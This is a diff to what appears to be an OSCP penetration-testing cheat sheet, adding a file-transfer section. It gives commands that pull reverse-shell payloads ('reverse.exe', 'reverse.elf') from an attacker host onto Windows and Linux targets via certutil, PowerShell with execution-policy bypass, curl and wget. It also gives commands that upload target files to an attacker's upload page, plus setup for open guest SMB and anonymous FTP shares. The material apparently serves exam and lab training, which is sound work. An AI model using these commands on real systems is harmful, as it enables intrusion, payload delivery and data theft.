@@ -238,6 +238,105 @@ python -c 'import pty;pty.spawn("/bin/bash")'
 
 ## 4. File transfers
 
+### 4.1. HTTP
+
+#### Download
+
+Web root: `/var/www/html`
+
+Windows:
+
+|   |   |
+|---|---|
+|certutil|`certutil.exe /urlcache /f /split http://kali.vx/reverse.exe %TEMP%\reverse.exe`|
+|PowerShell|`powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://kali.vx/reverse.exe','%TEMP%\reverse.exe')`|
+
+Linux:
+
+|   |   |
+|---|---|
+|cURL|`curl -O http://kali.vx/reverse.elf && chmod +x reverse.elf`|
+|Wget|`wget http://kali.vx/reverse.elf && chmod +x reverse.elf`|
+
+
+#### Upload
+
+<details>
+  <summary>Apache2 setup:</summary>
+
+Prepare uploads directory:
+
+```console
+mkdir /var/www/html/uploads
+chown www-data:www-data /var/www/html/uploads
+```
+
+☝️ apache2 runs as `www-data` user, it needs write permission on the uploads directory for uploads to succeed
+
+Prepare upload page:
+
+```console
+curl -o /var/www/html/upload.php https://raw.githubusercontent.com/joetanx/oscp/main/upload.php
+```
+
+☝️ The name for the upload parameter is named as default of `file` to accommodate the PowerShell `UploadFile` method of `System.Net.WebClient` which will `POST` the file to this name
+
+</details>
+
+Uploading:
+
+|   |   |
+|---|---|
+|PowerShell|`powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).UploadFile('http://kali.vx/upload.php','The Little Prince.jpg')`|
+|cURL|`curl -H 'Content-Type:multipart/form-data' -X POST -F file=@"The Little Prince.jpg" -v http://kali.vx/upload.php`|
+
+### 4.2. SMB
+
+<details>
+  <summary>Samba setup:</summary>
+
+Ref: [Create a passwordless guest share in Samba](https://www.techrepublic.com/article/how-to-create-a-passwordless-guest-share-in-samba/)
+
+```console
+sed -i '/;   interfaces/a interfaces = eth0' /etc/samba/smb.conf
+sed -i '/;   bind interfaces only = yes/a bind interfaces only = yes' /etc/samba/smb.conf
+mkdir /home/share
+chmod -R ugo+w /home/share
+cat << EOF >> /etc/samba/smb.conf
+[public]
+path = /home/share
+public = yes
+guest ok = yes
+writable = yes
+force create mode = 0666
+force directory mode = 0777
+browseable = yes
+EOF
+```
+
+</details>
+
+### 4.3. FTP
+
+<details>
+  <summary>FTP anonymous setup:</summary>
+
+`anon_root` default directory: `/srv/ftp`
+
+```console
+sed -i 's/anonymous_enable=NO/anonymous_enable=YES/' /etc/vsftpd.conf
+sed -i 's/#anon_upload_enable=YES/anon_upload_enable=YES/' /etc/vsftpd.conf
+```
+
+</details>
+
+Download:
+
+```cmd
+ftp -A $KALI
+ftp> get $FILENAME
+```
+
 ## 5. Port forwarding
 
 ### 5.1. SSH port forwarding
